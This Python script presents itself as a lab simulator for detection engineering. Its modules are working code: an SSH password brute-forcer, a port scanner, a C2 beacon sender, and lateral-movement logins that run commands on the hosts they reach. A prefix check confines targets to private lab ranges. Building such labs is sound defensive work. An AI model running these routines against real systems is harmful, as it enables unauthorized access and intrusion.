#!/usr/bin/env python3
"""
=============================================================================
SSH Brute-Force & Botnet Simulator
=============================================================================
EDUCATIONAL USE ONLY — runs inside isolated Docker lab networks.

This script SIMULATES botnet behaviors to generate realistic log traffic
for detection engineering. It does NOT:
  - attempt to crack real passwords
  - exfiltrate any real data
  - connect to the internet
  - harm any real systems

All traffic stays inside the isolated Docker bridge networks.

Simulated behaviors:
  1. SSH brute-force (repeated credential attempts)
  2. Network scanning (connection probing)
  3. C2 heartbeat (periodic check-in messages)
  4. Lateral movement (pivoting simulation)
  5. Infected host status (bot registration)
  6. Full botnet scenario (all of the above)

Usage:
  python3 simulator.py --help
  python3 simulator.py bruteforce --target 172.21.0.20
  python3 simulator.py scan --network 172.21.0.0/24
  python3 simulator.py c2 --c2-host 172.21.0.10
  python3 simulator.py lateral --pivot 172.21.0.20 --target 10.10.0.10
  python3 simulator.py botnet --full
=============================================================================
"""

import argparse
import socket
import time
import random
import json
import threading
import sys
import os
import logging
from datetime import datetime

try:
    import paramiko
except ImportError:
    paramiko = None

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

SAFETY_BANNER = """
╔══════════════════════════════════════════════════════════════╗
║  BOTNET SIMULATOR — EDUCATIONAL USE ONLY                    ║
║  All traffic is contained within isolated Docker networks.  ║
╚══════════════════════════════════════════════════════════════╝
"""

# Lab network ranges — simulator only targets these
ALLOWED_NETWORKS = [
    "172.21.0.",   # Network A
    "10.10.0.",    # Network B
    "192.168.100." # Monitor net
]

# Fake credential wordlist — these are the passwords in the victim containers
# In a real attack this would be rockyou.txt; here we use a tiny list for speed
SSH_USERNAMES = ["labuser", "admin", "root", "ubuntu", "test", "pi", "user"]
SSH_PASSWORDS = [
    "password", "password123", "admin", "123456", "letmein",
    "welcome", "monkey", "dragon", "master", "qwerty",
    "test", "lab", "default", "changeme", "pass1234"
]

# C2 message types (realistic botnet protocol simulation)
C2_MESSAGE_TYPES = [
    "REGISTER",       # bot announces itself to C2
    "HEARTBEAT",      # periodic check-in
    "STATUS",         # system info report
    "ACK_COMMAND",    # acknowledge received command
    "EXFIL_READY",    # (simulated) data ready to send
    "IDLE",           # bot waiting for commands
]

# Lateral movement techniques (names only — no real exploitation)
LATERAL_TECHNIQUES = [
    "ssh_credential_reuse",
    "ssh_key_discovery",
    "known_hosts_pivot",
    "password_spray",
    "service_discovery",
]

# ---------------------------------------------------------------------------
# Safety check
# ---------------------------------------------------------------------------

def safety_check(target: str) -> bool:
    """Verify target is within allowed lab networks."""
    allowed = any(target.startswith(net) for net in ALLOWED_NETWORKS)
    if not allowed:
        print(f"[SAFETY] Target {target} is outside allowed lab networks.")
        print(f"[SAFETY] Allowed ranges: {ALLOWED_NETWORKS}")
        print("[SAFETY] Aborting. This simulator only runs inside the lab.")
        return False
    return True


# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------

def setup_logging(module_name: str):
    log = logging.getLogger(module_name)
    log.setLevel(logging.DEBUG)
    handler = logging.StreamHandler()
    handler.setFormatter(logging.Formatter(
        "%(asctime)s [%(name)s] %(levelname)s %(message)s",
        datefmt="%Y-%m-%dT%H:%M:%S"
    ))
    log.addHandler(handler)
    return log


# ---------------------------------------------------------------------------
# Module 1: SSH Brute-Force Simulator
# ---------------------------------------------------------------------------

class SSHBruteforceSimulator:
    """
    Simulates an SSH brute-force attack by attempting real SSH connections
    with incorrect credentials. Generates authentic auth.log entries on
    the target because OpenSSH logs every failed attempt.

    Detection indicators generated:
      - Multiple "Failed password" entries in /var/log/auth.log
      - Many TCP connections to port 22 in rapid succession
      - Single source IP responsible for all attempts
    """

    def __init__(self, target: str, port: int = 22, delay: float = 0.3):
        self.target = target
        self.port = port
        self.delay = delay
        self.log = setup_logging("BruteForce")
        self.attempts = 0
        self.success = False
        self.cracked_cred = None

    def attempt_login(self, username: str, password: str) -> bool:
        """Try a single SSH login. Returns True if successful."""
        if not paramiko:
            # Fallback: just open a TCP connection to generate network traffic
            try:
                sock = socket.create_connection((self.target, self.port), timeout=3)
                banner = sock.recv(256)
                sock.close()
                self.log.info(
                    f"TCP probe {self.target}:{self.port} "
                    f"[user={username} pass={password}] banner={banner[:40]}"
                )
                return False
            except Exception as e:
                self.log.debug(f"Connection failed: {e}")
                return False

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                self.target,
                port=self.port,
                username=username,
                password=password,
                timeout=5,
                banner_timeout=5,
                auth_timeout=5,
                look_for_keys=False,
                allow_agent=False,
            )
            self.log.warning(
                f"[!] CREDENTIAL FOUND: {username}:{password} @ {self.target}"
            )
            client.close()
            return True
        except paramiko.AuthenticationException:
            self.log.info(
                f"FAILED [{self.attempts:04d}] {username}:{password} @ {self.target}"
            )
            return False
        except Exception as e:
            self.log.debug(f"Connection error ({type(e).__name__}): {e}")
            return False

    def run(self, max_attempts: int = 50, stop_on_success: bool = True):
        """Run the brute-force simulation."""
        if not safety_check(self.target):
            return

        self.log.info(f"Starting SSH brute-force simulation → {self.target}:{self.port}")
        self.log.info(f"Wordlist: {len(SSH_USERNAMES)} users × {len(SSH_PASSWORDS)} passwords")
        self.log.info(f"Delay between attempts: {self.delay}s")
        self.log.info("(Generating auth.log entries on the target — check victim1:/var/log/auth.log)")

        credentials = [
            (u, p) for u in SSH_USERNAMES for p in SSH_PASSWORDS
        ]
        random.shuffle(credentials)

        for username, password in credentials[:max_attempts]:
            self.attempts += 1
            success = self.attempt_login(username, password)
            if success:
                self.success = True
                self.cracked_cred = (username, password)
                if stop_on_success:
                    break
            time.sleep(self.delay + random.uniform(0, 0.1))  # jitter

        self.log.info(
            f"Brute-force complete: {self.attempts} attempts, "
            f"success={self.success}, cred={self.cracked_cred}"
        )


# ---------------------------------------------------------------------------
# Module 2: Port Scanner Simulator
# ---------------------------------------------------------------------------

class PortScanSimulator:
    """
    Simulates network reconnaissance by probing TCP ports.
    Uses real TCP connect attempts — generates real connection logs.

    Detection indicators generated:
      - Many short-lived TCP connections from one source
      - Connection attempts to closed/filtered ports (RST responses)
      - Sequential IP/port probing pattern in firewall logs
    """

    COMMON_PORTS = [22, 23, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]

    def __init__(self, network_prefix: str, delay: float = 0.2):
        self.network_prefix = network_prefix
        self.delay = delay
        self.log = setup_logging("Scanner")

    def probe_port(self, host: str, port: int, timeout: float = 1.0) -> bool:
        """Try a TCP connection to host:port. Returns True if open."""
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            sock.close()
            self.log.info(f"OPEN  {host}:{port}")
            return True
        except (ConnectionRefusedError, socket.timeout):
            self.log.debug(f"CLOSED/FILTERED {host}:{port}")
            return False
        except Exception as e:
            self.log.debug(f"ERROR {host}:{port} — {e}")
            return False

    def scan_host(self, host: str):
        """Scan common ports on a single host."""
        self.log.info(f"Scanning host {host}")
        open_ports = []
        for port in self.COMMON_PORTS:
            if self.probe_port(host, port):
                open_ports.append(port)
            time.sleep(self.delay)
        return open_ports

    def run(self, host_range: range = None):
        """Scan a range of hosts in the lab network."""
        if host_range is None:
            host_range = range(1, 30)  # scan .1 through .29

        self.log.info(f"Starting network scan simulation on {self.network_prefix}x")
        for i in host_range:
            host = f"{self.network_prefix}{i}"
            if not safety_check(host):
                continue
            self.scan_host(host)
            time.sleep(self.delay * 2)


# ---------------------------------------------------------------------------
# Module 3: C2 Heartbeat Simulator
# ---------------------------------------------------------------------------

class C2HeartbeatSimulator:
    """
    Simulates a botnet C2 (Command and Control) beacon protocol.
    Bots periodically check in with the C2 server via HTTP POST messages.

    This creates a simple HTTP listener (the C2) and multiple "bot" threads
    that beacon to it at regular intervals — with realistic jitter.

    Detection indicators generated:
      - Regular periodic HTTP connections at consistent intervals
      - Identical User-Agent and payload structure across multiple hosts
      - Low data volume, high connection frequency (classic beaconing pattern)
      - Connections to an unusual internal IP on a non-standard port
    """

    def __init__(self, c2_host: str, c2_port: int = 8888,
                 beacon_interval: int = 30, jitter: int = 5):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.beacon_interval = beacon_interval
        self.jitter = jitter
        self.log = setup_logging("C2Beacon")
        self.bot_id = f"bot-{random.randint(1000, 9999)}"
        self.running = False

    def build_beacon(self) -> dict:
        """Build a realistic beacon payload."""
        return {
            "bot_id": self.bot_id,
            "type": random.choice(C2_MESSAGE_TYPES),
            "timestamp": datetime.utcnow().isoformat(),
            "hostname": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "os": "Linux 5.15",
            "uptime_sec": random.randint(3600, 864000),
            "tasks_pending": random.randint(0, 3),
            "exfil_bytes": random.randint(0, 4096),
        }

    def send_beacon(self) -> bool:
        """Send a single beacon to the C2 server via raw TCP."""
        payload = json.dumps(self.build_beacon()).encode()
        try:
            sock = socket.create_connection((self.c2_host, self.c2_port), timeout=5)
            http_request = (
                f"POST /beacon HTTP/1.1\r\n"
                f"Host: {self.c2_host}:{self.c2_port}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(payload)}\r\n"
                f"User-Agent: Mozilla/5.0 (compatible; updater/1.0)\r\n"
                f"X-Bot-ID: {self.bot_id}\r\n"
                f"\r\n"
            ).encode() + payload
            sock.sendall(http_request)
            response = sock.recv(1024)
            sock.close()
            self.log.info(
                f"BEACON SENT → {self.c2_host}:{self.c2_port} "
                f"[bot={self.bot_id} type={self.build_beacon()['type']}]"
            )
            return True
        except Exception as e:
            self.log.warning(f"Beacon failed: {e} (C2 may not be listening)")
            return False

    def run(self, num_beacons: int = 10):
        """Send beacons with jitter at regular intervals."""
        if not safety_check(self.c2_host):
            return

        self.log.info(
            f"Starting C2 beacon simulation "
            f"[interval={self.beacon_interval}s ±{self.jitter}s, "
            f"count={num_beacons}]"
        )
        self.log.info("(Detection: look for regular HTTP POST to port 8888)")

        for i in range(num_beacons):
            self.send_beacon()
            sleep_time = self.beacon_interval + random.uniform(-self.jitter, self.jitter)
            self.log.debug(f"Next beacon in {sleep_time:.1f}s")
            time.sleep(max(1, sleep_time))

        self.log.info("Beacon simulation complete")


# ---------------------------------------------------------------------------
# Module 4: Lateral Movement Simulator
# ---------------------------------------------------------------------------

class LateralMovementSimulator:
    """
    Simulates an attacker using a compromised pivot machine to reach
    machines in a segmented network (Network B) that are not directly
    accessible from outside.

    This generates realistic east-west traffic patterns — SSH connection
    attempts from an internal machine to other internal machines.

    Detection indicators generated:
      - SSH connection attempts originating from an internal host
      - Sequential connection attempts to multiple IPs in a new subnet
      - Short-lived SSH sessions (reconnaissance, not interactive use)
      - known_hosts file growing on the pivot machine
    """

    INTERNAL_TARGETS = [
        "10.10.0.10",   # victim3
        "10.10.0.11",   # victim4
        "10.10.0.50",   # honeypot
        "10.10.0.1",    # gateway
        "10.10.0.100",  # imaginary management server
    ]

    def __init__(self, pivot_host: str, delay: float = 1.0):
        self.pivot_host = pivot_host
        self.delay = delay
        self.log = setup_logging("LateralMove")
        self.technique = random.choice(LATERAL_TECHNIQUES)

    def attempt_pivot(self, target: str, username: str, password: str):
        """Attempt SSH connection to an internal target."""
        if not safety_check(target):
            return False

        self.log.info(
            f"LATERAL [{self.technique}] {self.pivot_host} → {target} "
            f"user={username}"
        )

        if not paramiko:
            # Fallback: TCP probe only
            try:
                sock = socket.create_connection((target, 22), timeout=3)
                sock.close()
                self.log.info(f"TCP probe succeeded {target}:22")
            except Exception as e:
                self.log.debug(f"TCP probe failed {target}:22 — {e}")
            return False

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                target, port=22, username=username, password=password,
                timeout=5, look_for_keys=False, allow_agent=False
            )
            self.log.warning(f"[!] LATERAL ACCESS GAINED: {target} user={username}")
            # Run a minimal reconnaisance command
            stdin, stdout, stderr = client.exec_command("hostname && id")
            output = stdout.read().decode().strip()
            self.log.warning(f"[!] Remote output: {output}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            self.log.info(f"Auth failed {target}")
            return False
        except Exception as e:
            self.log.debug(f"Connection error {target}: {e}")
            return False

    def run(self):
        """Simulate lateral movement from pivot to internal targets."""
        self.log.info(
            f"Starting lateral movement simulation from pivot={self.pivot_host}"
        )
        self.log.info(
            f"Technique: {self.technique}"
        )
        self.log.info(
            "Targeting Network B (10.10.0.0/24) — only reachable via pivot"
        )

        for target in self.INTERNAL_TARGETS:
            for username in SSH_USERNAMES[:3]:
                for password in SSH_PASSWORDS[:5]:
                    self.attempt_pivot(target, username, password)
                    time.sleep(self.delay)


# ---------------------------------------------------------------------------
# Module 5: Infected Host Simulator
# ---------------------------------------------------------------------------

class InfectedHostSimulator:
    """
    Simulates behaviors of a machine that has already been compromised
    and is running botnet malware. Combines beaconing, scanning, and
    status reporting into a continuous background simulation.

    This represents what happens AFTER initial compromise — the persistence
    and ongoing activity phase of a botnet infection.

    Detection indicators generated:
      - Periodic outbound connections at regular intervals (beaconing)
      - Occasional port scans to find new targets
      - Status messages with system information
      - Unusual process behavior patterns
    """

    def __init__(self, c2_host: str, target_network: str):
        self.c2_host = c2_host
        self.target_network = target_network
        self.log = setup_logging("InfectedHost")
        self.bot_id = f"bot-{socket.gethostname()}-{os.getpid()}"
        self.infected_since = datetime.utcnow().isoformat()
        self.running = False

    def report_status(self):
        """Build and log a status report (as if sending to C2)."""
        status = {
            "event": "STATUS_REPORT",
            "bot_id": self.bot_id,
            "infected_since": self.infected_since,
            "hostname": socket.gethostname(),
            "timestamp": datetime.utcnow().isoformat(),
            "tasks": {
                "scanning": random.choice([True, False]),
                "spreading": random.choice([True, False]),
                "beaconing": True,
                "persistence": True,
            },
            "new_victims": random.randint(0, 2),
            "failed_attempts": random.randint(0, 15),
        }
        self.log.info(f"STATUS: {json.dumps(status)}")
        return status

    def run(self, duration_seconds: int = 120):
        """Run the infected host simulation for a set duration."""
        if not safety_check(self.c2_host):
            return

        self.running = True
        self.log.info(
            f"[INFECTED HOST SIMULATION] Running for {duration_seconds}s"
        )
        self.log.info(f"Bot ID: {self.bot_id}")

        start = time.time()
        cycle = 0

        while self.running and (time.time() - start) < duration_seconds:
            cycle += 1
            self.log.info(f"--- Infection cycle {cycle} ---")
            self.report_status()

            # Every 3 cycles: simulate a scan for new victims
            if cycle % 3 == 0:
                self.log.info("SCAN: Looking for new targets on local network")
                scanner = PortScanSimulator(self.target_network)
                for i in random.sample(range(1, 30), 5):
                    host = f"{self.target_network}{i}"
                    scanner.probe_port(host, 22, timeout=0.5)

            # Every 5 cycles: simulate C2 beacon
            if cycle % 5 == 0:
                beacon = C2HeartbeatSimulator(
                    self.c2_host, beacon_interval=0, jitter=0
                )
                beacon.send_beacon()

            sleep_time = 10 + random.uniform(-2, 2)
            time.sleep(sleep_time)

        self.log.info("Infected host simulation complete")


# ---------------------------------------------------------------------------
# CLI Entry Point
# ---------------------------------------------------------------------------

def main():
    print(SAFETY_BANNER)

    parser = argparse.ArgumentParser(
        description="SSH Brute-Force & Botnet Simulator — Educational Use Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    subparsers = parser.add_subparsers(dest="mode", help="Simulation mode")

    # bruteforce
    bf = subparsers.add_parser("bruteforce", help="Simulate SSH brute-force attack")
    bf.add_argument("--target", default="172.21.0.20", help="Target IP")
    bf.add_argument("--port", type=int, default=22)
    bf.add_argument("--delay", type=float, default=0.3, help="Seconds between attempts")
    bf.add_argument("--max-attempts", type=int, default=50)

    # scan
    sc = subparsers.add_parser("scan", help="Simulate network port scanning")
    sc.add_argument("--network", default="172.21.0.", help="Network prefix (e.g. 172.21.0.)")
    sc.add_argument("--delay", type=float, default=0.2)

    # c2
    c2 = subparsers.add_parser("c2", help="Simulate C2 heartbeat beaconing")
    c2.add_argument("--c2-host", default="172.21.0.10", help="C2 server IP")
    c2.add_argument("--port", type=int, default=8888)
    c2.add_argument("--interval", type=int, default=10, help="Beacon interval in seconds")
    c2.add_argument("--count", type=int, default=10, help="Number of beacons to send")

    # lateral
    lat = subparsers.add_parser("lateral", help="Simulate lateral movement / pivoting")
    lat.add_argument("--pivot", default="172.21.0.20", help="IP of the compromised pivot host")
    lat.add_argument("--delay", type=float, default=0.5)

    # infected
    inf = subparsers.add_parser("infected", help="Simulate ongoing infected host behavior")
    inf.add_argument("--c2-host", default="172.21.0.10")
    inf.add_argument("--target-net", default="172.21.0.", help="Network prefix to scan")
    inf.add_argument("--duration", type=int, default=120)

    # botnet (full scenario)
    bot = subparsers.add_parser("botnet", help="Run full botnet scenario (all modules)")
    bot.add_argument("--target", default="172.21.0.20")
    bot.add_argument("--c2-host", default="172.21.0.10")

    args = parser.parse_args()

    if not args.mode:
        parser.print_help()
        sys.exit(0)

    if args.mode == "bruteforce":
        sim = SSHBruteforceSimulator(args.target, args.port, args.delay)
        sim.run(args.max_attempts)

    elif args.mode == "scan":
        sim = PortScanSimulator(args.network, args.delay)
        sim.run()

    elif args.mode == "c2":
        sim = C2HeartbeatSimulator(args.c2_host, args.port, args.interval)
        sim.run(args.count)

    elif args.mode == "lateral":
        sim = LateralMovementSimulator(args.pivot, args.delay)
        sim.run()

    elif args.mode == "infected":
        sim = InfectedHostSimulator(args.c2_host, args.target_net)
        sim.run(args.duration)

    elif args.mode == "botnet":
        print("[*] Starting full botnet scenario...")
        print("[*] Phase 1: Reconnaissance scan")
        PortScanSimulator("172.21.0.").run(range(1, 25))

        print("[*] Phase 2: SSH brute-force on primary target")
        SSHBruteforceSimulator(args.target).run(max_attempts=30)

        print("[*] Phase 3: Lateral movement simulation")
        LateralMovementSimulator(args.target).run()

        print("[*] Phase 4: C2 beaconing")
        C2HeartbeatSimulator(args.c2_host, beacon_interval=5).run(num_beacons=6)

        print("[*] Full scenario complete")
        print("[*] Check logs: docker exec victim1 cat /var/log/auth.log")
        print("[*] Check monitor: docker exec monitor python3 /lab/monitor/analyzer.py")


if __name__ == "__main__":
    main()
